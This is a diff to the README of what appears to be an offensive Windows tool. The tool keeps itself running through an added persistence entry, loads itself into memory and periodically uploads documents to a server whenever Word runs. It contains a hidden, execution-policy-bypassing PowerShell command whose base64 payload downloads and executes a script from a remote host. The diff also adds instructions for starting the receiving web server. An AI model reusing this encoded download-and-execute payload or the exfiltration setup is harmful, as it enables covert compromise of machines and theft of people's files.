@@ -16,7 +16,7 @@ The persistence in the execution of this software is implemented by adding an en
 
 This payload makes a GET request to the server to load the software into memory and executes it.
 
-```powershell
+```
 powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -enc aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAvAG0AYQBpAG4ALgBwAHMAMQAnACkA
 ```
 
@@ -50,6 +50,15 @@ When the software fins that WinWord process starts, it send each 30 seconds the 
 ![Saved file into server](./img/server-file.png)
 
 ![Content of the file](./img/open-file.png)
+
+#### Running the server
+
+To execute the server it is only need to execute the following steps:
+
+```
+pip install -r requirements.txt
+python3 webserver.py
+```
 
 ### Possible Enhancements
 
